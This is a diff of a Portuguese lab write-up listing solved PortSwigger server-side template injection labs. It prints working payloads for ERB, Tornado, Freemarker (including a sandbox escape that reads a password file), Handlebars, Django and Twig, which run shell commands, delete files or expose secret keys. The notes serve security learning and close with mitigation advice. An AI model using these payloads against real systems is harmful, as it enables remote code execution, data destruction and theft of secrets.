@@ -1,106 +1,78 @@
----
+📝 Server-Side Template Injection (SSTI)
+PortSwigger Web Security Academy — Practitioner & Expert Labs
 
-# 📝 Server-Side Template Injection (SSTI)
-## PortSwigger Web Security Academy — Practitioner Labs
+🎯 O que é essa vulnerabilidade?
+A Injeção de Modelo Lado Servidor ocorre quando a aplicação insere dados enviados pelo usuário diretamente no código do motor de renderização, sem nenhuma validação ou proteção. Isso permite que o invasor identifique qual motor está sendo usado, execute comandos arbitrários, acesse dados sensíveis e até contorne restrições de segurança como ambientes isolados ("sandbox").
 
----
+🧪 Laboratórios Resolvidos
 
-## 📌 O que é a vulnerabilidade?
-A **Injeção de Modelo Lado Servidor** acontece quando uma aplicação insere dados fornecidos pelo usuário diretamente no código de um modelo de renderização, sem higienização ou validação adequada. Isso permite que um invasor identifique o motor de modelo utilizado, execute código arbitrário no servidor e acesse dados sensíveis.
+🟢 Nível: Practitioner
 
----
+1. Basic server-side template injection — ✅ Resolvido
+Motor: ERB (Embedded Ruby)
+Cenário: O parâmetro message da URL é renderizado diretamente pelo template.
+Confirmação: <%= 7*7 %> retorna 49 na página.
+Exploração: <%= system("rm /home/carlos/morale.txt") %>
+Lição: Sintaxe básica do motor já permite execução total de comandos.
 
-## 🧪 Laboratórios Resolvidos
+2. Basic server-side template injection (code context) — ✅ Resolvido
+Motor: Tornado (Python)
+Cenário: O valor escolhido para exibição do nome do autor fica dentro de uma expressão já existente.
+Confirmação: user.name}}{{7*7}} retorna o resultado do cálculo ao lado do nome.
+Exploração: user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')}}
+Lição: É preciso "quebrar" o contexto original antes de injetar o código.
 
-### 1. Basic server-side template injection — ✅ Resolvido
-**Motor:** ERB (Embedded Ruby)
-**Cenário:** O parâmetro `message` é renderizado diretamente pelo template ERB.
-**Passos:**
-- Confirme a injeção com: `<%= 7*7 %>` → retorna `49`
-- Execute comando no sistema: `<%= system("rm /home/carlos/morale.txt") %>`
-**Impacto:** Execução arbitrária de comandos no servidor.
+3. Server-side template injection using documentation — ✅ Resolvido
+Motor: Freemarker (Java)
+Cenário: Edição de descrições de produtos permite inserir sintaxe do template.
+Confirmação: ${foobar} revela o motor na mensagem de erro.
+Exploração: <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
+Lição: A documentação oficial mostra recursos perigosos que não foram bloqueados.
 
----
+4. Server-side template injection in an unknown language with a documented exploit — ✅ Resolvido
+Motor: Handlebars (Node.js)
+Cenário: Motor não identificado de início; só mensagens de erro ajudam a descobrir.
+Confirmação: Sintaxe inválida revela o Handlebars nos logs.
+Exploração: Uso de exploit público adaptado para o alvo na URL.
+Lição: Quando o motor é desconhecido, exploits já conhecidos pela comunidade resolvem o problema.
 
-### 2. Basic server-side template injection (code context) — ✅ Resolvido
-**Motor:** Tornado (Python)
-**Cenário:** O valor de exibição do nome do autor é inserido dentro de uma expressão já existente no template.
-**Passos:**
-- Saia da expressão original: `user.name}}{{7*7}}`
-- Execute comandos: `user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')}}`
-- O comando só é executado ao carregar uma página que renderiza o nome do autor.
-**Impacto:** Quebra de contexto e execução de código Python arbitrário.
+5. Server-side template injection with information disclosure via user-supplied objects — ✅ Resolvido
+Motor: Django Template Language
+Cenário: Objetos internos do framework ficam acessíveis no template.
+Confirmação: {% debug %} lista todos os objetos disponíveis.
+Exploração: {{settings.SECRET_KEY}} revela a chave secreta do sistema.
+Lição: Acesso não filtrado a objetos expõe dados críticos da aplicação.
 
----
+🔴 Nível: Expert
+6. Server-side template injection in a sandboxed environment — ✅ Resolvido
+Motor: Freemarker
+Cenário: Há uma tentativa de bloquear acesso a recursos perigosos, mas mal feita.
+Confirmação: ${product.getClass()} prova que métodos nativos ainda estão liberados.
+Exploração: Cadeia de métodos nativos do Java para contornar a proteção e ler arquivos:
+plaintext
 
-### 3. Server-side template injection using documentation — ✅ Resolvido
-**Motor:** Freemarker (Java)
-**Cenário:** Edição de modelos de descrição de produtos permite inserir sintaxe do template.
-**Passos:**
-- Identifique o motor com `${foobar}` → erro confirma Freemarker
-- Use o método `new()` para instanciar classe de execução:
-  ```
-  <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
-  ```
-**Impacto:** Acesso a classes perigosas do Java via documentação oficial.
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
 
----
+Lição: Sandboxes mal implementadas podem ser quebradas usando apenas métodos nativos de objetos.
 
-### 4. Server-side template injection in an unknown language with a documented exploit — ✅ Resolvido
-**Motor:** Handlebars (Node.js)
-**Cenário:** Parâmetro `message` vulnerável; motor desconhecido inicialmente.
-**Passos:**
-- Identifique o motor por mensagens de erro de sintaxe
-- Use exploit documentado da comunidade adaptado:
-  ```handlebars
-  wrtz{{#with "s" as |string|}}
-  {{#with "e"}}
-  {{#with split as |conslist|}}
-  {{this.pop}}
-  {{this.push (lookup string.sub "constructor")}}
-  {{this.pop}}
-  {{#with string.split as |codelist|}}
-  {{this.pop}}
-  {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
-  {{this.pop}}
-  {{#each conslist}}
-  {{#with (string.sub.apply 0 codelist)}}
-  {{this}}
-  {{/with}}
-  {{/each}}
-  {{/with}}
-  {{/with}}
-  {{/with}}
-  ```
-- Codifique para URL e acesse para executar.
-**Impacto:** Uso de exploits públicos para obter execução de código em motores desconhecidos.
+7. Server-side template injection with a custom exploit — ✅ Resolvido
+Motor: Twig / Tornado
+Cenário: Não há função pronta para executar comandos — é preciso usar métodos já existentes na aplicação.
+Confirmação: Erros revelam os métodos setAvatar() e gdprDelete() do objeto user.
+Exploração:
 
----
+    Definir o arquivo alvo como avatar: user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')
+    Chamar o método nativo de exclusão: user.gdprDelete()
+    Lição: Muitas vezes a exploração não precisa de código novo — basta usar o que a própria aplicação já oferece de forma insegura.
 
-### 5. Server-side template injection with information disclosure via user-supplied objects — ✅ Resolvido
-**Motor:** Django Template Language
-**Cenário:** Objetos do sistema são acessíveis dentro do template.
-**Passos:**
-- Identifique o motor com sintaxe inválida → erro confirma Django
-- Liste objetos disponíveis: `{% debug %}`
-- Acesse dado sensível: `{{settings.SECRET_KEY}}`
-- Envie a chave obtida para resolver o laboratório.
-**Impacto:** Vazamento de informações críticas do framework.
+🛡️ Lições aprendidas e mitigação
 
----
+    Sempre valide e escape qualquer dado enviado pelo usuário antes de inserir em templates.
+    Restrinja o que os templates podem acessar: bloqueie métodos nativos, objetos internos e funções de sistema.
+    Implemente sandboxes bem testadas e atualizadas, evitando deixar métodos fundamentais como getClass() acessíveis.
+    Nunca confie apenas em listas de permissão superficiais — atacantes podem encontrar caminhos alternativos.
 
-## 🛡️ Boas Práticas de Correção
-- Nunca insira entrada do usuário diretamente no código do modelo
-- Utilize mecanismos de escape automático
-- Restrinja o que os modelos podem acessar e executar
-- Use listas brancas de objetos e funções permitidas
-- Atualize constantemente os motores de modelo
-
----
-
-**Autor:** [Aislan]
-**Plataforma:** PortSwigger Web Security Academy
-**Nível:** Practitioner
-**Status:** Todos os laboratórios da seção resolvidos ✅
-
----
+Autor: [Aislan]
+Plataforma: PortSwigger Web Security Academy
+Seção concluída: Server-Side Template Injection — Practitioner + Expert
+Progresso: 7/7 laboratórios resolvidos ✅
